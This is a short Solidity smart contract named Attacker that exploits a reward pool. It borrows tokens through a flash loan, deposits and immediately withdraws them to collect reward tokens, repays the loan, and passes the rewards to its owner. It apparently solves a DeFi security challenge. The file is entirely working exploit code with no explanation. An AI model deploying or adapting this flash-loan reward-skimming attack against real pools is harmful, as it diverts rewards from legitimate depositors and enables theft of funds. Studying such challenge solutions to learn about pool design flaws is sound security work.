pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

interface IRewarderPool {
    function rewardToken() external view returns (address);
    function deposit(uint256) external;
    function withdraw(uint256) external;
}

contract Attacker {

    address private token;
    address private pool;
    address private flashLoaner;
    address private owner;

    constructor(address tokenAddress, address poolAddress, address flashLoanerAddress) {
        token = tokenAddress;
        pool = poolAddress;
        flashLoaner = flashLoanerAddress;
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == flashLoaner, "sender must be flash loaner");

        IERC20(token).approve(pool, amount);
        IRewarderPool(pool).deposit(amount);
        IRewarderPool(pool).withdraw(amount);

        IERC20(token).transfer(flashLoaner, amount);

        address rewardToken = IRewarderPool(pool).rewardToken();
        uint256 balance = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).transfer(owner, balance);
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        IFlashLoanerPool(flashLoaner).flashLoan(amount);
    }
}
